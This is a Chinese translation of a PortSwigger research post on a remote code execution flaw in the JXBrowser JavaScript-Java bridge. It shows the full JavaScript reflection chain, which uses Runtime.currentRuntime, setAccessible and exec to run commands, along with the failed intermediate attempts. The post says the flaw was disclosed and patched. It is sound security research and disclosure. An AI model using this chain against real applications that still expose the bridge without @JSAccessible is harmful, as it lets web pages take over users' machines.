> 原文链接: https://www.anquanke.com//post/id/85101 


# 【技术分享】JXBrowser JavaScript-Java bridge 中的RCE漏洞


                                阅读量   
                                **117704**
                            
                        |
                        
                                                                                                                                    ![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



##### 译文声明

本文是翻译文章，文章原作者，文章来源：blog.portswigger.net
                                <br>原文地址：[http://blog.portswigger.net/2016/12/rce-in-jxbrowser-javascriptjava-bridge.html](http://blog.portswigger.net/2016/12/rce-in-jxbrowser-javascriptjava-bridge.html)

译文仅供参考，具体内容表达以及含义原文为准

[![](https://p3.ssl.qhimg.com/t0174ce7e7983439b36.png)](https://p3.ssl.qhimg.com/t0174ce7e7983439b36.png)

翻译：[WisFree](http://bobao.360.cn/member/contribute?uid=2606963099)

预估稿费：200RMB（不服你也来投稿啊！）

投稿方式：发送邮件至linwei#360.cn，或登陆网页版在线投稿

**<br>**

**前言**



我近期正在研究如何使用JXBrowser来实现一套试验性的扫描技术。当我在使用JXBrowser库的过程中，我突然想到，是否可以通过调用不同的类来攻击JXBrowser客户端，并通过一个Web页面来实现远程代码执行呢？

**<br>**

**安全客百科-JxBrowser**



JxBrowser是一款采用Java语言开发的浏览器组件。JxBrowser能在Windows、Linux、Mac OS X (Intel和PPC-based)平台上将Mozilla Firefox浏览器完美地整合到Java AWT/Swing应用程序里。该库程序使用Gecko设计引擎来转换HTML文档。因而保证了它能与许多Internet标准（如HTML 4、CSS、XML、JavaScript以及其它）兼容。

[![](https://p5.ssl.qhimg.com/t014b42b902152f34d1.png)](https://p5.ssl.qhimg.com/t014b42b902152f34d1.png)

**<br>**

**漏洞利用技术分析**



我编写的[JavaScript代码](https://jxbrowser.support.teamdev.com/support/solutions/articles/9000013062-calling-java-from-javascript)（Java Bridge）大致如下：



```
browser.addScriptContextListener(new ScriptContextAdapter() `{`
    @Override
    public void onScriptContextCreated(ScriptContextEvent event) `{`
        Browser browser = event.getBrowser();
        JSValue window = browser.executeJavaScriptAndReturnValue("window");
        window.asObject().setProperty("someObj", new someJavaClass());
    `}`
`}`);
```

上面这段示例代码是从JXBrowser网站上摘录下来的。大致来说，这段代码向浏览器实例中插入了一个脚本，然后获取到了window对象，并将其转换成了一个Java JSValue对象。接下来，代码在window对象中设置了“someObj”，然后将这个Java对象传递给JavaScript window对象，这样就设置好了我们的bridge（Java桥接模式）了！根据开发文档的描述，我们在这里只能使用公共类。当我们创建好了一个bridge之后，我们在与其交互的过程中还需要使用一些JavaScript脚本。<br>



```
setTimeout(function f()`{`
    if(window.someObj &amp;&amp; typeof window.someObj.javaFunction === 'function') `{`
      window.someObj.javaFunction("Called Java function from JavaScript");
    `}` else `{`
       setTimeout(f,0);
    `}`
`}`,0);
```

我在这里设置了超时（setTimeout），它可以检测我们是否已经获取到了这个“someObj”。如果没有检测到这个对象的话，代码会不断调用这个方法，直到检测到了这个对象为止。一开始，我曾尝试使用getRuntime()方法来查看我是否可以获取到一个runtime对象的实例，并运行calc（计算器）。。我所使用的调用代码如下所示：<br>

```
window.someObj.getClass().forName('java.lang.Runtime').getRuntime();
```

但是，我得到了以下的错误返回信息：<br>

```
Neither public field nor method named 'getRuntime' exists in the java.lang.Class Java object（Java对象java.lang.Class中不存在公共域或getRuntime方法）
```

难道是因为我们无法在这里调用getRuntime方法么？于是乎，我打算用更简单的方法来尝试一下，代码如下所示：<br>

```
window.someObj.getClass().getSuperclass().getName();
```

这一次，我们的代码似乎成功运行了。接下来，我开始尝试枚举出所有可用的方法。代码和运行结果如下所示：<br>



```
methods = window.someObj.getClass().getSuperclass().getMethods();
for(i=0;i&lt;methods.length();i++) `{`
   console.log(methods[i].getName());
`}`
wait
wait
wait
equals
toString
hashCode
getClass
notify
notifyAll
```

大家可以看到，我成功地枚举出了所有的方法。接下来，我打算尝试使用一下ProcessBuilder，看看会发生什么。但是，当我每一次尝试调用构造器的时候，代码都崩溃了。根据报错信息来看，似乎构造器需要一个Java数组来作为输入。这也就意味着，我得想办法创建一个用来保存字符串的Java数组，然后将其传递给ProcessBuilder的构造器。<br>



```
window.someObj.getClass().forName("java.lang.ProcessBuilder").newInstance("open","-a Calculator");
//Failed
window.someObj.getClass().forName("java.lang.ProcessBuilder").newInstance(["open","-a Calculator"]);
//Failed too
```

别着急，我们暂时先不管这个问题，先让我们创建另一个对象来证明这个漏洞的存在。我通过下面这段代码成功地创建了一个java.net.Socket类的实例。代码如下所示：<br>

```
window.someObj.getClass().forName("java.net.Socket").newInstance();
```

但是，当我尝试调用这个对象的时候，我再一次遇到了问题，这一次系统返回的错误信息告诉我“参数类型发生错误”。虽然我现在可以创建socket对象，但是我却无法使用它们。由于我无法向该对象传递任何的参数，所以这个对象对于我来说暂时没有任何的意义，因为它根本无法使用。接下来，我又尝试去创建并使用java.io.File类的对象，但是我又失败了。我感觉现在已经走投无路了，我虽然可以创建出这些对象，但是每当这些函数需要我提供参数的时候，我都无法提供正确类型的参数值。不仅newInstance方法无法正常工作，而且其他的调用方法也无法正确运行。<br>

**<br>**

**柳暗花明又一村**



我需要帮助，我非常迫切地需要Java大神的帮助！幸运的是，如果你在Portswigger这样的地方工作的话，你就会发现你永远不是实验室里最聪明的那个人。在我“走投无路”的时候，我便打算向Mike和Patrick寻求帮助。我把我现在遇到的问题向他们解释了一遍：我需要创建一个Java数组，然后将这个数组作为参数传递给函数方法。接下来，我们的工作重点就放在了如何在bridge中创建数组对象。

Mike认为，也许可以使用一个arraylist来实现我们的目标，因为我们可以通过toArray()这个简单的方法来将arraylist转换为一个数组（array）对象。



```
list = window.someObj.getClass().forName("java.util.ArrayList").newInstance();
list.add("open");
list.add("-a");
list.add("Calculator");
a = list.toArray();
window.someObj.getClass().forName("java.lang.ProcessBuilder").newInstance(a));
```

此次调用又抛出了一个异常（提示此方法不存在），并且系统提示我们传递过来的参数实际上是一个JSObject。所以，即使我们创建了一个ArrayList并用toArray方法进行转换，得到的也是一个js对象，所以我们传递给ProcessBuilder对象的永远都是类型不正确的参数。<br>

接下来，我们又尝试直接去创建一个数组（Array）。但是，我们在调用java.lang.reflect.Array实例的时候又出现了问题，系统再一次报错：参数类型不正确。因为对象和方法需要的是一个int类型的参数，但是我们发送的是一个double类型的值。于是，我们打算尝试使用java.lang.Integer来创建一个int类型的值。但是，我又一次悲剧了，这次还是那该死的参数类型问题。Patrick认为，我们可以使用MAX_INT属性来创建一个大数组。可能大家以为，这一次可以得到我们所需要的int类型了，但事实并非如此，Java Bridge会将整型数据（Integer）转换为double类型。

为了解决这个问题，我们打算用下面这段代码进行尝试：

```
window.someObj.getClass().forName("java.lang.Integer").getDeclaredField("MAX_VALUE").getInt(null);
```

但是这一次，我们得到了系统所抛出的一个空指针异常。在思考片刻之后，我认为，为什么不尝试发送“123”，看看函数方法是否会接受这个参数值。其实我觉得这并不会起什么作用，但是它却能够打印出我们最大的int值。接下来，我们继续尝试通过最大的int值来调用数组构造器，果然不出所料，系统再一次报错了。然后，我们决定研究下runtime对象，看看我们是否可以使用同样的技术来做些什么。Mike建议使用getDeclareField方法并获取当前的runtime属性，由于它是一个私有属性，所以我们还要将其设置为“可访问”（setAccessible(true)）。经过千难万阻，我们终于成功地打开了计算器（calculator.exe）。操作代码如下所示：<br>



```
field = window.someObj.getClass().forName('java.lang.Runtime').getDeclaredField("currentRuntime");
field.setAccessible(true);
runtime = field.get(123);
runtime.exec("open -a Calculator");
```



**总结**



这也就意味着，攻击者可以使用这项攻击技术来对任何一个使用了JXBrowser的网站（部署了JavaScript-Java Bridge）实施攻击，并完全接管目标客户端。<br>

我们已经私下将该漏洞报告给了TeamDev（JXBrowser的项目开发组），他们在了解到该漏洞之后，便在第一时间发布了一个更新补丁。更新补丁启用了白名单机制，并且允许开发人员使用[@JSAccessible annotation](https://jxbrowser.support.teamdev.com/support/solutions/articles/9000099124--jsaccessible)。请注意，如果你的应用程序没有使用@JSAccessible annotation的话，系统并不会强制开启白名单，而此时上述的攻击方法将仍然奏效。


